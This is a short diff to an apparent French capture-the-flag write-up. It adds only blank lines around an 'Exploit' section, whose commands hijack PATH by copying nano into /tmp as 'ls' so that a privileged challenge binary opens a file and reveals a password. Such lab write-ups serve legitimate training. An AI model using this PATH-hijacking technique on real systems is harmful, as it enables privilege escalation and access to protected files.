@@ -13,6 +13,9 @@ Exécuter le code compilé pour afficher le mot de passe
 ## Exploit :
 
 mkdir -pv /tmp/exploit
+
 cp -avr $(which nano) /tmp/exploit/ls
+
 export PATH=/tmp/exploit
+
 ./ch12
